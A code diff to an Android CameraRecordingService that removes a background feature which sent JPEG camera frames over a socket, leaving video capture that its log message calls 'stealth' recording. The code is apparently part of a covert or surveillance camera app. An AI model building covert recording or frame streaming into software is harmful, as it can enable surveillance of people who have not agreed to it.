@@ -272,35 +272,10 @@ class CameraRecordingService : LifecycleService() {
 
         val videoCapture = VideoCapture.withOutput(recorder)
 
-        // Simultaneous Live Image Analysis for live surveillance preview
-        val imageAnalysis = ImageAnalysis.Builder()
-            .setTargetResolution(Size(640, 480))
-            .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
-            .build()
-
-        val executor = cameraExecutor ?: Executors.newSingleThreadExecutor().also { cameraExecutor = it }
-
-        imageAnalysis.setAnalyzer(executor) { imageProxy ->
-            val now = System.currentTimeMillis()
-            // Rate-limit to approx 15 FPS (every 65ms) to keep bandwidth minimal
-            if (now - lastFrameTime >= 65) {
-                lastFrameTime = now
-                try {
-                    val bitmap = imageProxy.toBitmap()
-                    val out = ByteArrayOutputStream()
-                    bitmap.compress(Bitmap.CompressFormat.JPEG, 60, out)
-                    val jpegBytes = out.toByteArray()
-                    SocketManager.sendFrame(applicationContext, jpegBytes)
-                } catch (e: Exception) {
-                    Log.w(TAG, "Frame conversion error in recording service: ${e.message}")
-                }
-            }
-            imageProxy.close()
-        }
-
         try {
-            // Bind both video capture and live image analysis to service lifecycle
-            provider.bindToLifecycle(this, cameraSelector, videoCapture, imageAnalysis)
+            // Video Recording is #1 TOP PRIORITY:
+            // Bind dedicated VideoCapture use-case exclusively to camera hardware
+            provider.bindToLifecycle(this, cameraSelector, videoCapture)
 
             currentOutputFile = StorageUtil.createOutputFile(this)
             val fileOutputOptions = FileOutputOptions.Builder(currentOutputFile!!).build()
@@ -312,7 +287,7 @@ class CameraRecordingService : LifecycleService() {
             activeRecording = pendingRecording.start(ContextCompat.getMainExecutor(this)) { recordEvent ->
                 when (recordEvent) {
                     is VideoRecordEvent.Start -> {
-                        Log.i(TAG, "Video recording & simultaneous live stream started.")
+                        Log.i(TAG, "🎥 Dedicated 720p HD stealth video recording started successfully.")
                         prefs.isRecording = true
                         isStopping = false
                         if (shouldVibrate) {
